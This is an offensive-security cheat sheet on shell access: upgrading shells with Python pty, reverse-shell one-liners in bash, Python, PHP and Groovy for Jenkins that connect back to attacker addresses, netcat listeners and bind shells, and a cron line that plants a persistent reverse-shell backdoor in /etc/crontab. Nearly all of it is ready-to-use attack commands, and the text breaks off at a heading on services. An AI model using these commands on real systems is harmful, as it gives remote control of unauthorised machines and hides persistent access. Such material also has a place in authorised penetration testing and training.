### Upgrading a shell
- Linux/Unix targets with python
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
```
python -c 'import pty; pty.spawn("/bin/bash")'
```
- Set TERM to resize the terminal
```
export TERM=xterm stty rows <ROWS> cols <COLS>
```
### Reverse shells 
- Set up a listener
```
nc -nlvp <PORT>
```
- Connect to the listener
```
bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1
```
- python one-liner
```
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```
- PHP one-liner
```
<?php echo shell_exec('bash -i >& /dev/tcp/10.11.0.106/443 0>&1');?>
```
- Groovy Reverse-shell (for jenkins)
```
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
### Create a bind shell
- If outbound connections from the target are restricted create a bind shell instead
- on the target machine
```
nc -nlvp <PORT> -e /bin/bash
```
- from the attacking machine to connect to the target
```
nc <TARGET_IP> <PORT>
```
### Drop a persistent backdoor
- For long-term nested shell reliability, create a persistent backdoor
- Cron
```
echo '* * * * * bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1' >> /etc/crontab
```
- Using a service or scheduled task